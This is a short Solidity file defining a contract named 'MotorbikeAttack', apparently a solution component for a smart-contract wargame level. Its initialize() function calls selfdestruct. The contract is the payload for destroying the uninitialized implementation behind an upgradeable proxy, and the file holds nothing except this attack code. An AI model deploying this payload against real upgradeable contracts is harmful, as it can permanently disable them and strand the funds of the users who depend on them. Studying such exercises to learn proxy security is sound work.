// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

contract MotorbikeAttack {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}